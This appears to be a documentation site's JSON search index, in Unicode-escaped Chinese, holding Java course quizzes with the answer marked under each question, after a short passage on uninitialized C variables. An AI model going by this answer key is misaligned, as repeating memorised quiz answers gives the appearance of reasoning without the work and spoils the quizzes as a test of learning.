\u81f3\u4e8e\u4f60\u53ef\u80fd\u60f3\u8ba8\u8bba\u67d0\u4e9b\u65f6\u5019\u8fd9\u4e2a\u7a0b\u5e8f\u53ef\u4ee5\u6b63\u5e38\u901a\u8fc7OJ\u7684\u68c0\u9a8c\u7684\u539f\u56e0\uff0c\u5f88\u7b80\u5355\uff0c\u4e00\u79cd\u53ef\u80fd\u6027\u6bd4\u8f83\u5927\u7684\u539f\u56e0\u5c31\u662f\u4e0a\u8ff0\u81ea\u52a8\u53d8\u91cf\u7684\u521d\u503c\u5728\u90a3\u4e2a\u65f6\u5019\u6070\u597d\u4e3a0\uff0c\u8fd9\u6837\u5373\u4f7ffind\u51fd\u6570\u4e2d\u6ca1\u6709\u66f4\u65b0\u5b83\u7684\u503c\uff0c\u4e5f\u4e0d\u4f1a\u51fa\u73b0\u95ee\u9898\u3002\u6539\u53d8\u81ea\u52a8\u53d8\u91cf\u58f0\u660e\u7684\u4f4d\u7f6e\u53ef\u80fd\u4f1a\u8ba9\u5b83\u4eec\u5728\u6808\u4e2d\u7684\u76f8\u5bf9\u4f4d\u7f6e\u53d1\u751f\u6539\u53d8\uff0c\u8fd9\u5c06\u53ef\u80fd\u8ba9\u7a0b\u5e8f\u78b0\u5de7\u901a\u8fc7\u4e00\u4e9b\u68c0\u67e5\u70b9\u3002\u4f46\u662f\u2014\u2014 \u8bf7\u770b\u597d\u4f60\u7684\u81ea\u52a8\u53d8\u91cf\uff0c\u8bb0\u5f97\u521d\u59cb\u5316\u5b83\u4eec\u3002 What happens to a declared, uninitialized variable in C? Does it have a value?","title":"\u521d\u59cb\u5316\u7684\u59ff\u52bf"},{"location":"uooc/java/1/","text":"1 \u6982\u8ff0 Java\u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\u7528\u5230\u4e00\u5957JDK\u5de5\u5177\uff0c\u5176\u4e2djava.exe\u662f\u6307\uff1a A. Java\u6587\u6863\u751f\u6210\u5668 B. Java\u89e3\u91ca\u5668 C. Java\u7f16\u8bd1\u5668 D. Java\u7c7b\u5206\u89e3\u5668 \u89e3\u51b3\u65b9\u6848 B Java\u5d4c\u5165\u5f0f\u5e94\u7528\u5f00\u53d1\u5e73\u53f0\u540d\u79f0\u4e3a: A. JDK B. J2ME C. J2SE D. J2EE \u89e3\u51b3\u65b9\u6848 B","title":"1 \u6982\u8ff0"},{"location":"uooc/java/1/#1","text":"","title":"1 \u6982\u8ff0"},{"location":"uooc/java/1/#javajdkjavaexe","text":"A. Java\u6587\u6863\u751f\u6210\u5668 B. Java\u89e3\u91ca\u5668 C. Java\u7f16\u8bd1\u5668 D. Java\u7c7b\u5206\u89e3\u5668","title":"Java\u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\u7528\u5230\u4e00\u5957JDK\u5de5\u5177\uff0c\u5176\u4e2djava.exe\u662f\u6307\uff1a"},{"location":"uooc/java/1/#_1","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/1/#java","text":"A. JDK B. J2ME C. J2SE D. J2EE","title":"Java\u5d4c\u5165\u5f0f\u5e94\u7528\u5f00\u53d1\u5e73\u53f0\u540d\u79f0\u4e3a:"},{"location":"uooc/java/1/#_2","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/10/","text":"10.1 \u7ebf\u7a0b\u6982\u8ff0 \u5728java\u7a0b\u5e8f\u4e2d\uff0c\u4e0b\u5217\u5173\u4e8e\u7ebf\u7a0b\u7684\u8bf4\u6cd5\u9519\u8bef\u7684\u662f\uff08 \uff09\u3002 A. run\u65b9\u6cd5\u662f\u8fd0\u884c\u7ebf\u7a0b\u7684\u4e3b\u4f53 B. \u591a\u4e2a\u7ebf\u7a0b\u8fd0\u884c\u65f6\u6267\u884c\u987a\u5e8f\u662f\u6309\u987a\u5e8f\u6267\u884c\u7684 C. \u5982\u679crun\u65b9\u6cd5\u6267\u884c\u7ed3\u675f\u4e86\uff0c\u8bf4\u660e\u7ebf\u7a0b\u6b7b\u4ea1\u4e86 D. \u5728Java\u4e2d\uff0c\u9ad8\u4f18\u5148\u7ea7\u7684\u53ef\u8fd0\u884c\u7ebf\u7a0b\u4f1a\u62a2\u5360\u4f4e\u4f18\u5148\u7ea7\u7ebf\u7a0b \u89e3\u51b3\u65b9\u6848 B 10.2 \u521b\u5efa\u7ebf\u7a0b Thread\u7c7b\u7528\u6765\u521b\u5efa\u548c\u63a7\u5236\u7ebf\u7a0b\uff0c\u542f\u52a8\u4e00\u4e2a\u7ebf\u7a0b\u5e94\u8be5\u4f7f\u7528\u4e0b\u9762\u7684\u54ea\u4e2a\u65b9\u6cd5\uff1f\uff08 \uff09 A. init() B. start() C. run() D. notifyAll() \u89e3\u51b3\u65b9\u6848 B 10.3 \u7ebf\u7a0b\u540c\u6b65\u673a\u5236 \u5f53\u591a\u4e2a\u7ebf\u7a0b\u5bf9\u8c61\u64cd\u4f5c\u540c\u4e00\u8d44\u6e90\u65f6\uff0c\u4f7f\u7528\uff08 \uff09\u5173\u952e\u5b57\u8fdb\u884c\u8d44\u6e90\u540c\u6b65\u3002 A. transient B. synchronized C. public D. static \u89e3\u51b3\u65b9\u6848 B \u6d4b\u9a8c \u7ed9Java\u7ebf\u7a0b\u8bbe\u5b9a\u4f18\u5148\u7ea7\u7684\u6210\u5458\u65b9\u6cd5\u662f\uff08 \uff09\u3002 A. getPriority() B. setPriority() C. getThread() D. setThread() \u89e3\u51b3\u65b9\u6848 B","title":"10 \u7ebf\u7a0b"},{"location":"uooc/java/10/#101","text":"","title":"10.1 \u7ebf\u7a0b\u6982\u8ff0"},{"location":"uooc/java/10/#java","text":"A. run\u65b9\u6cd5\u662f\u8fd0\u884c\u7ebf\u7a0b\u7684\u4e3b\u4f53 B. \u591a\u4e2a\u7ebf\u7a0b\u8fd0\u884c\u65f6\u6267\u884c\u987a\u5e8f\u662f\u6309\u987a\u5e8f\u6267\u884c\u7684 C. \u5982\u679crun\u65b9\u6cd5\u6267\u884c\u7ed3\u675f\u4e86\uff0c\u8bf4\u660e\u7ebf\u7a0b\u6b7b\u4ea1\u4e86 D. \u5728Java\u4e2d\uff0c\u9ad8\u4f18\u5148\u7ea7\u7684\u53ef\u8fd0\u884c\u7ebf\u7a0b\u4f1a\u62a2\u5360\u4f4e\u4f18\u5148\u7ea7\u7ebf\u7a0b","title":"\u5728java\u7a0b\u5e8f\u4e2d\uff0c\u4e0b\u5217\u5173\u4e8e\u7ebf\u7a0b\u7684\u8bf4\u6cd5\u9519\u8bef\u7684\u662f\uff08 \uff09\u3002"},{"location":"uooc/java/10/#_1","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/10/#102","text":"","title":"10.2 \u521b\u5efa\u7ebf\u7a0b"},{"location":"uooc/java/10/#thread","text":"A. init() B. start() C. run() D. notifyAll()","title":"Thread\u7c7b\u7528\u6765\u521b\u5efa\u548c\u63a7\u5236\u7ebf\u7a0b\uff0c\u542f\u52a8\u4e00\u4e2a\u7ebf\u7a0b\u5e94\u8be5\u4f7f\u7528\u4e0b\u9762\u7684\u54ea\u4e2a\u65b9\u6cd5\uff1f\uff08 \uff09"},{"location":"uooc/java/10/#_2","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/10/#103","text":"","title":"10.3 \u7ebf\u7a0b\u540c\u6b65\u673a\u5236"},{"location":"uooc/java/10/#_3","text":"A. transient B. synchronized C. public D. static","title":"\u5f53\u591a\u4e2a\u7ebf\u7a0b\u5bf9\u8c61\u64cd\u4f5c\u540c\u4e00\u8d44\u6e90\u65f6\uff0c\u4f7f\u7528\uff08 \uff09\u5173\u952e\u5b57\u8fdb\u884c\u8d44\u6e90\u540c\u6b65\u3002"},{"location":"uooc/java/10/#_4","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/10/#_5","text":"","title":"\u6d4b\u9a8c"},{"location":"uooc/java/10/#java_1","text":"A. getPriority() B. setPriority() C. getThread() D. setThread()","title":"\u7ed9Java\u7ebf\u7a0b\u8bbe\u5b9a\u4f18\u5148\u7ea7\u7684\u6210\u5458\u65b9\u6cd5\u662f\uff08 \uff09\u3002"},{"location":"uooc/java/10/#_6","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/11/","text":"11.1 \u7f51\u7edc\u5730\u5740 InetAddress\u7c7b\u4e2d\u7684\uff08 \uff09\u65b9\u6cd5\u53ef\u4ee5\u5b9e\u73b0\u6b63\u5411\u540d\u79f0\u89e3\u6790\u3002 A. isReachable B. getHostAddress() C. getHostName() D. getByName() \u89e3\u51b3\u65b9\u6848 D 11.2 UDP\u6570\u636e\u62a5 \u4f7f\u7528UDP\u5957\u63a5\u5b57\u901a\u4fe1\u65f6\uff0c\u5e38\u7528\uff08 \uff09\u7c7b\u628a\u8981\u53d1\u9001\u7684\u4fe1\u606f\u6253\u5305\u3002 A. String B. DatagramSocket C. MulticastSocket D. DatagramPacket \u89e3\u51b3\u65b9\u6848 D 11.3 TCP\u8fde\u63a5 ServerSocket\u7684\u76d1\u542c\u65b9\u6cd5accept()\u7684\u8fd4\u56de\u503c\u7c7b\u578b\u662f\uff08 \uff09\u3002 A. void B. Object C. Socket D. DatagramPacket \u89e3\u51b3\u65b9\u6848 C","title":"11 Java\u7f51\u7edc\u7f16\u7a0b"},{"location":"uooc/java/11/#111","text":"","title":"11.1 \u7f51\u7edc\u5730\u5740"},{"location":"uooc/java/11/#inetaddress","text":"A. isReachable B. getHostAddress() C. getHostName() D. getByName()","title":"InetAddress\u7c7b\u4e2d\u7684\uff08 \uff09\u65b9\u6cd5\u53ef\u4ee5\u5b9e\u73b0\u6b63\u5411\u540d\u79f0\u89e3\u6790\u3002"},{"location":"uooc/java/11/#_1","text":"D","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/11/#112-udp","text":"","title":"11.2 UDP\u6570\u636e\u62a5"},{"location":"uooc/java/11/#udp","text":"A. String B. DatagramSocket C. MulticastSocket D. DatagramPacket","title":"\u4f7f\u7528UDP\u5957\u63a5\u5b57\u901a\u4fe1\u65f6\uff0c\u5e38\u7528\uff08 \uff09\u7c7b\u628a\u8981\u53d1\u9001\u7684\u4fe1\u606f\u6253\u5305\u3002"},{"location":"uooc/java/11/#_2","text":"D","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/11/#113-tcp","text":"","title":"11.3 TCP\u8fde\u63a5"},{"location":"uooc/java/11/#serversocketaccept","text":"A. void B. Object C. Socket D. DatagramPacket","title":"ServerSocket\u7684\u76d1\u542c\u65b9\u6cd5accept()\u7684\u8fd4\u56de\u503c\u7c7b\u578b\u662f\uff08 \uff09\u3002"},{"location":"uooc/java/11/#_3","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/2/","text":"2.1\u6570\u636e\u7c7b\u578b \u4e0b\u5217\u6570\u7ec4\u5b9a\u4e49\u53ca\u8d4b\u503c\uff0c\u9519\u8bef\u7684\u662f\uff08 \uff09\u3002 A. int a[]={1,2,3}; B. int a[]; C. a=new int[3]; a[1]=1; a[2]=2; a[3]=3; D. int a[][]=new int[3][]; a[0]=new int[2]; a[1]=new int[2]; a[2]=new int[2]; \u89e3\u51b3\u65b9\u6848 C \u8d8a\u754c JAVA\u8bed\u8a00\u4f7f\u7528\u7684\u5b57\u7b26\u96c6\u662f\uff08 \uff09\u3002 A. ASCII B. EBCDIC C. Unicode D. BCD \u89e3\u51b3\u65b9\u6848 C \u4e0b\u9762\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u4e2d\uff0c\u5fc5\u987b\u8fdb\u884c\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u7684\u662f\uff08 \uff09\u3002 A. byte->int; B. int->char; C. short->float; D. float->double; \u89e3\u51b3\u65b9\u6848 B \u4ee5\u4e0b\u6807\u8bc6\u7b26\u4e2d\uff08 \uff09\u662f\u4e0d\u5408\u6cd5\u7684\u3002 A. _small B. Big C. $12ab D. 7hello \u89e3\u51b3\u65b9\u6848 D \u4e0b\u9762\u8d4b\u503c\u8bed\u53e5\u4e0d\u4f1a\u4ea7\u751f\u7f16\u8bd1\u9519\u8bef\u6216\u8b66\u544a\u7684\u662f\uff08 \uff09\u3002 A. char a=\u2019abc\u2019 ; B. byte b=145; C. float c=3.14; D. int i=12; \u89e3\u51b3\u65b9\u6848 D \u5c0f\u6570\u9ed8\u8ba4double 2.2 \u63a7\u5236\u8bed\u53e5 \u4e0b\u5217\u8bed\u53e5\u6267\u884c\u540e\uff0ci\u3001j\u7684\u503c\u662f\uff08 \uff09\u3002 1 2 3 int i = 0 , j = 10 ; do { if ( i ++>-- j ) break ;} while ( true ); A. i=6\uff0cj=4 B. i=6\uff0cj=5 C. i=5\uff0cj=5 D. i=5\uff0cj=4 \u89e3\u51b3\u65b9\u6848 A \u5f53\u4e0b\u9762\u7a0b\u5e8f\u8f93\u51fa\u201d\u7b2c2\u533a\u57df\u65f6\u201d\u65f6\uff0cx\u7684\u8303\u56f4\u4e3a\uff08 \uff09\u3002 1 2 3 if ( x <- 100 ){ System . out . println ( \u201c \u7b2c1\u533a\u57df \u201d );} else if ( x < 0 ){ System . out . println ( \u201c \u7b2c2\u533a\u57df \u201d );} else { System . out . println ( \u201c \u7b2c3\u533a\u57df \u201d );} A. x<=-100 B. x>-100 C. x<0 && x>=-100 D. x>=0 \u89e3\u51b3\u65b9\u6848 C \u4e0b\u9762\u7a0b\u5e8f\u7684\u8fd0\u884c\u7ed3\u679c\u4e3a\uff08 \uff09\u3002 1 2 3 4 5 6 7 8 int i ; for ( i = 0 ; i < 4 ; i ++){ switch ( i ){ case 1 : System . out . print ( \u201c 1 \u201d ); case 2 : System . out . print ( \u201c 2 \u201d ); break ; default : System . out . print ( \u201c 0 \u201d ); } } A. 12 B. 01220 C. 0120 D. 120 \u89e3\u51b3\u65b9\u6848 B JAVA\u8bed\u8a00\u4e2d\u63a7\u5236\u7ed3\u6784\u5305\u62ec\uff08 \uff09\u3002 A. \u987a\u5e8f\u7ed3\u6784\u3001\u9009\u62e9\u7ed3\u6784\u3001\u5faa\u73af\u7ed3\u6784 B. \u987a\u5e8f\u7ed3\u6784\u3001\u5faa\u73af\u7ed3\u6784 C. \u987a\u5e8f\u7ed3\u6784\u3001\u9009\u62e9\u7ed3\u6784 D. \u9009\u62e9\u7ed3\u6784\u3001\u5faa\u73af\u7ed3\u6784 \u89e3\u51b3\u65b9\u6848 A \u4e0b\u5217\u8bed\u53e5\u6267\u884c\u540e\uff0cc\u7684\u503c\u662f\uff08 \uff09\u3002 1 2 3 4 char c ; for ( c = 'z' ; c < 'a' ; c -= 4 ){ if ( c <= 'o' ) break ; } A. \u2018z\u2019 B. \u2018n\u2019 C. \u2018m\u2019 D. \u2018p\u2019 \u89e3\u51b3\u65b9\u6848 A \u5751\u9898 \u4e0b\u5217\u8bed\u53e5\u6267\u884c\u540e\uff0cj\u7684\u503c\u662f\uff08 \uff09\u3002 1 2 3 int j = 0 , i = 3 ; while (-- i > 0 ) j += j -= i ; A. 0 B. 5 C. -5 D. -17 \u89e3\u51b3\u65b9\u6848 C 2.3 \u8fd0\u7b97\u7b26 \u6267\u884c\u4e0b\u9762\u7a0b\u5e8f\u540e\uff0c\u7ed3\u8bba\u6b63\u786e\u7684\u662f\uff08 \uff09\u3002 1 2 3 4 int x , y , z ; x = 1 ; y = 2 ; z =(++ x + y ++== 5 ? y + x --:-- y + x ); A. x\u7684\u503c\u4e3a1\uff0cy\u7684\u503c\u4e3a3\uff0cz\u7684\u503c\u4e3a5 B. x\u7684\u503c\u4e3a2\uff0cy\u7684\u503c\u4e3a2\uff0cz\u7684\u503c\u4e3a5 C. x\u7684\u503c\u4e3a1\uff0cy\u7684\u503c\u4e3a3\uff0cz\u7684\u503c\u4e3a4 D. x\u7684\u503c\u4e3a2\uff0cy\u7684\u503c\u4e3a2\uff0cz\u7684\u503c\u4e3a4 \u89e3\u51b3\u65b9\u6848 D \u82e5a\u662fint\u578b\u53d8\u91cf\uff0c\u8868\u8fbe\u5f0fa=(int)(25.8/3%3);\u6267\u884c\u540ea\u7684\u503c\u4e3a\uff08 \uff09\u3002 A. 1 B. 2 C. 3 D. 4 \u89e3\u51b3\u65b9\u6848 B \u8bbe\u5404\u4e2a\u53d8\u91cf\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a\uff08 \uff09\u9009\u9879\u7684\u503c\u4e3atrue\u3002 1 2 int a = 1 , b = 1 ; boolean flag = a != b ++; A. a++==b; B. !(++a==b); C. (++a==b) || flag; D. (++a==b) && flag; \u89e3\u51b3\u65b9\u6848 C","title":"2 \u6570\u636e\u7c7b\u578b\u3001\u8fd0\u7b97\u7b26\u3001\u8868\u8fbe\u5f0f\u548c\u8df3\u8f6c\u8bed\u53e5"},{"location":"uooc/java/2/#21","text":"","title":"2.1\u6570\u636e\u7c7b\u578b"},{"location":"uooc/java/2/#_1","text":"A. int a[]={1,2,3}; B. int a[]; C. a=new int[3]; a[1]=1; a[2]=2; a[3]=3; D. int a[][]=new int[3][]; a[0]=new int[2]; a[1]=new int[2]; a[2]=new int[2];","title":"\u4e0b\u5217\u6570\u7ec4\u5b9a\u4e49\u53ca\u8d4b\u503c\uff0c\u9519\u8bef\u7684\u662f\uff08  \uff09\u3002"},{"location":"uooc/java/2/#_2","text":"C \u8d8a\u754c","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/2/#java","text":"A. ASCII B. EBCDIC C. Unicode D. BCD","title":"JAVA\u8bed\u8a00\u4f7f\u7528\u7684\u5b57\u7b26\u96c6\u662f\uff08  \uff09\u3002"},{"location":"uooc/java/2/#_3","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/2/#_4","text":"A. byte->int; B. int->char; C. short->float; D. float->double;","title":"\u4e0b\u9762\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u4e2d\uff0c\u5fc5\u987b\u8fdb\u884c\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u7684\u662f\uff08  \uff09\u3002"},{"location":"uooc/java/2/#_5","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/2/#_6","text":"A. _small B. Big C. $12ab D. 7hello","title":"\u4ee5\u4e0b\u6807\u8bc6\u7b26\u4e2d\uff08  \uff09\u662f\u4e0d\u5408\u6cd5\u7684\u3002"},{"location":"uooc/java/2/#_7","text":"D","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/2/#_8","text":"A. char a=\u2019abc\u2019 ; B. byte b=145; C. float c=3.14; D. int i=12;","title":"\u4e0b\u9762\u8d4b\u503c\u8bed\u53e5\u4e0d\u4f1a\u4ea7\u751f\u7f16\u8bd1\u9519\u8bef\u6216\u8b66\u544a\u7684\u662f\uff08  \uff09\u3002"},{"location":"uooc/java/2/#_9","text":"D \u5c0f\u6570\u9ed8\u8ba4double","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/2/#22","text":"","title":"2.2 \u63a7\u5236\u8bed\u53e5"},{"location":"uooc/java/2/#ij","text":"1 2 3 int i = 0 , j = 10 ; do { if ( i ++>-- j ) break ;} while ( true ); A. i=6\uff0cj=4 B. i=6\uff0cj=5 C. i=5\uff0cj=5 D. i=5\uff0cj=4","title":"\u4e0b\u5217\u8bed\u53e5\u6267\u884c\u540e\uff0ci\u3001j\u7684\u503c\u662f\uff08   \uff09\u3002"},{"location":"uooc/java/2/#_10","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/2/#2x","text":"1 2 3 if ( x <- 100 ){ System . out . println ( \u201c \u7b2c1\u533a\u57df \u201d );} else if ( x < 0 ){ System . out . println ( \u201c \u7b2c2\u533a\u57df \u201d );} else { System . out . println ( \u201c \u7b2c3\u533a\u57df \u201d );} A. x<=-100 B. x>-100 C. x<0 && x>=-100 D. x>=0","title":"\u5f53\u4e0b\u9762\u7a0b\u5e8f\u8f93\u51fa\u201d\u7b2c2\u533a\u57df\u65f6\u201d\u65f6\uff0cx\u7684\u8303\u56f4\u4e3a\uff08  \uff09\u3002"},{"location":"uooc/java/2/#_11","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/2/#_12","text":"1 2 3 4 5 6 7 8 int i ; for ( i = 0 ; i < 4 ; i ++){ switch ( i ){ case 1 : System . out . print ( \u201c 1 \u201d ); case 2 : System . out . print ( \u201c 2 \u201d ); break ; default : System . out . print ( \u201c 0 \u201d ); } } A. 12 B. 01220 C. 0120 D. 120","title":"\u4e0b\u9762\u7a0b\u5e8f\u7684\u8fd0\u884c\u7ed3\u679c\u4e3a\uff08  \uff09\u3002"},{"location":"uooc/java/2/#_13","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/2/#java_1","text":"A. \u987a\u5e8f\u7ed3\u6784\u3001\u9009\u62e9\u7ed3\u6784\u3001\u5faa\u73af\u7ed3\u6784 B. \u987a\u5e8f\u7ed3\u6784\u3001\u5faa\u73af\u7ed3\u6784 C. \u987a\u5e8f\u7ed3\u6784\u3001\u9009\u62e9\u7ed3\u6784 D. \u9009\u62e9\u7ed3\u6784\u3001\u5faa\u73af\u7ed3\u6784","title":"JAVA\u8bed\u8a00\u4e2d\u63a7\u5236\u7ed3\u6784\u5305\u62ec\uff08   \uff09\u3002"},{"location":"uooc/java/2/#_14","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/2/#c","text":"1 2 3 4 char c ; for ( c = 'z' ; c < 'a' ; c -= 4 ){ if ( c <= 'o' ) break ; } A. \u2018z\u2019 B. \u2018n\u2019 C. \u2018m\u2019 D. \u2018p\u2019","title":"\u4e0b\u5217\u8bed\u53e5\u6267\u884c\u540e\uff0cc\u7684\u503c\u662f\uff08 \uff09\u3002"},{"location":"uooc/java/2/#_15","text":"A \u5751\u9898","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/2/#j","text":"1 2 3 int j = 0 , i = 3 ; while (-- i > 0 ) j += j -= i ; A. 0 B. 5 C. -5 D. -17","title":"\u4e0b\u5217\u8bed\u53e5\u6267\u884c\u540e\uff0cj\u7684\u503c\u662f\uff08   \uff09\u3002"},{"location":"uooc/java/2/#_16","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/2/#23","text":"","title":"2.3 \u8fd0\u7b97\u7b26"},{"location":"uooc/java/2/#_17","text":"1 2 3 4 int x , y , z ; x = 1 ; y = 2 ; z =(++ x + y ++== 5 ? y + x --:-- y + x ); A. x\u7684\u503c\u4e3a1\uff0cy\u7684\u503c\u4e3a3\uff0cz\u7684\u503c\u4e3a5 B. x\u7684\u503c\u4e3a2\uff0cy\u7684\u503c\u4e3a2\uff0cz\u7684\u503c\u4e3a5 C. x\u7684\u503c\u4e3a1\uff0cy\u7684\u503c\u4e3a3\uff0cz\u7684\u503c\u4e3a4 D. x\u7684\u503c\u4e3a2\uff0cy\u7684\u503c\u4e3a2\uff0cz\u7684\u503c\u4e3a4","title":"\u6267\u884c\u4e0b\u9762\u7a0b\u5e8f\u540e\uff0c\u7ed3\u8bba\u6b63\u786e\u7684\u662f\uff08  \uff09\u3002"},{"location":"uooc/java/2/#_18","text":"D","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/2/#aintaint25833a","text":"A. 1 B. 2 C. 3 D. 4","title":"\u82e5a\u662fint\u578b\u53d8\u91cf\uff0c\u8868\u8fbe\u5f0fa=(int)(25.8/3%3);\u6267\u884c\u540ea\u7684\u503c\u4e3a\uff08   \uff09\u3002"},{"location":"uooc/java/2/#_19","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/2/#true","text":"1 2 int a = 1 , b = 1 ; boolean flag = a != b ++; A. a++==b; B. !(++a==b); C. (++a==b) || flag; D. (++a==b) && flag;","title":"\u8bbe\u5404\u4e2a\u53d8\u91cf\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a\uff08   \uff09\u9009\u9879\u7684\u503c\u4e3atrue\u3002"},{"location":"uooc/java/2/#_20","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/3/","text":"3.2 \u7c7b\u7684\u57fa\u672c\u67b6\u6784\u4ecb\u7ecd \u4e0b\u5217\u54ea\u4e2a\u7c7b\u58f0\u660e\u662f\u6b63\u786e\u7684\uff1f A. abstract final class H1{} B. abstract private move(){} C. protected private number; D. public abstract class Car{} \u89e3\u51b3\u65b9\u6848 D \u4ee5\u4e0b\u9009\u9879\u7b26\u5408\u5bf9\u8c61\u548c\u7c7b\u7684\u5173\u7cfb\u7684\u662f\uff1a A. \u4eba\u548c\u8001\u864e B. \u4e66\u548c\u6c7d\u8f66 C. \u7236\u4eb2\u548c\u513f\u5b50 D. \u6c7d\u8f66\u548c\u4ea4\u901a\u5de5\u5177 \u89e3\u51b3\u65b9\u6848 D \u4e0b\u9762\u5173\u4e8ejava\u4e2d\u7c7b\u7684\u8bf4\u6cd5\u54ea\u4e2a\u662f\u4e0d\u6b63\u786e\u7684\uff1f A. \u7c7b\u4f53\u4e2d\u53ea\u80fd\u6709\u53d8\u91cf\u5b9a\u4e49\u3001\u5e38\u91cf\u5b9a\u4e49\u548c\u6210\u5458\u65b9\u6cd5\u7684\u5b9a\u4e49\uff0c\u4e0d\u80fd\u5305\u542b\u201cx=3;\u201d\u8fd9\u6837\u7684\u8bed\u53e5\u3002 B. \u6784\u9020\u51fd\u6570\u662f\u7c7b\u4e2d\u7684\u7279\u6b8a\u65b9\u6cd5 C. \u4e3b\u7c7b\u4e00\u5b9a\u8981\u58f0\u660e\u4e3apublic\u3002 D. \u4e00\u4e2ajava\u6587\u4ef6\u4e2d\u53ef\u4ee5\u6709\u591a\u4e2aclass\u5b9a\u4e49\u3002 \u89e3\u51b3\u65b9\u6848 C \u4e0b\u9762\u54ea\u4e2a\u5355\u8bcd\u662fJava\u8bed\u8a00\u7684\u5173\u952e\u5b57\uff1f A. Float B. this C. string D. unsigned \u89e3\u51b3\u65b9\u6848 B \u4e0b\u5217\u54ea\u9879\u662fJava\u7f16\u7a0b\u6240\u5fc5\u987b\u7684\u9ed8\u8ba4\u5f15\u7528\u5305\uff1f A. java.sys\u5305 B. java.lang\u5305 C. java.net\u5305\u3000 D. \u4ee5\u4e0a\u90fd\u4e0d\u662f \u89e3\u51b3\u65b9\u6848 B \u4ee5\u4e0b\u54ea\u4e2a\u662fJava\u7684\u5173\u952e\u5b57\uff1f A. NULL B. new C. instanceOf D. wend \u89e3\u51b3\u65b9\u6848 B \u4e0b\u9762\u54ea\u4e2a\u662fJava\u8bed\u8a00\u4e2d\u6b63\u786e\u7684\u6807\u8bc6\u7b26\uff1f A. 3com B. import C. that D. this \u89e3\u51b3\u65b9\u6848 C \u6570\u7ec4\u4e2d\u53ef\u4ee5\u5305\u542b\u4ec0\u4e48\u7c7b\u578b\u7684\u5143\u7d20\uff1f A. int\u578b B. String\u578b C. \u6570\u7ec4 D. \u4ee5\u4e0a\u90fd\u53ef\u4ee5 \u89e3\u51b3\u65b9\u6848 D \u5728Java\u4e2d\u51fd\u6570main()\u7684\u8fd4\u56de\u503c\u662f\uff1a A. String B. int C. char D. void \u89e3\u51b3\u65b9\u6848 D Java\u5e94\u7528\u5728\u6d88\u8d39\u7535\u5b50\u5e02\u573a\u4e0a\u5f00\u53d1\u5e73\u53f0\u540d\u79f0\u4e3a: A. JDK B. J2ME C. J2SE D. J2EE \u89e3\u51b3\u65b9\u6848 B 3.4 \u4f7f\u7528\u5bf9\u8c61 \u6784\u9020\u65b9\u6cd5\u4f55\u65f6\u88ab\u8c03\u7528\uff1f A. \u7c7b\u5b9a\u4e49\u65f6 B. \u521b\u5efa\u5bf9\u8c61\u65f6 C. \u8c03\u7528\u5bf9\u8c61\u65b9\u6cd5\u65f6 D. \u4f7f\u7528\u5bf9\u8c61\u7684\u53d8\u91cf\u65f6 \u89e3\u51b3\u65b9\u6848 B \u5728\u7f16\u5199Java Application\u7a0b\u5e8f\u65f6\uff0c\u82e5\u9700\u8981\u4f7f\u7528\u5230\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u8bed\u53e5\uff0c\u5fc5\u987b\u5728\u7a0b\u5e8f\u7684\u5f00\u5934\u5199\u4e0a\u4ee5\u4e0b\u54ea\u6761\u8bed\u53e5\uff1f A. import java.awt.*; B. import java.applet.Applet; C. import java.io.*; D. import java.awt.Graphis; \u89e3\u51b3\u65b9\u6848 C \u8ba4\u771f\u9605\u8bfb\u4ee3\u7801\uff0c\u9009\u62e9\u6b63\u786e\u7684\u9009\u9879 1 2 3 4 5 6 7 8 9 public class MyClass { public static void main ( String arguments []) { amethod ( arguments ); } public void amethod ( String [] arguments ) { System . out . println ( arguments ); } } A. \u8fd9\u6bb5\u4ee3\u7801\u662f\u9519\u8bef\u7684\uff0cmain\u65b9\u6cd5\u4e0d\u80fd\u63a5\u53d7\u5b57\u7b26\u4e32\u53c2\u6570 B. \u8fd9\u6bb5\u4ee3\u7801\u662f\u9519\u8bef\u7684\uff0camethod\u65b9\u6cd5\u4e2d\u7684\u5b57\u7b26\u4e32\u6570\u7ec4\u5c1a\u672a\u521d\u59cb\u5316 C. \u8fd9\u6bb5\u4ee3\u7801\u662f\u9519\u8bef\u7684\uff0cmain\u65b9\u6cd5\u4e0d\u80fd\u8c03\u7528\u5b9e\u4f8b\u65b9\u6cd5 D. \u8fd9\u6bb5\u4ee3\u7801\u662f\u6b63\u786e\u7684 \u89e3\u51b3\u65b9\u6848 C 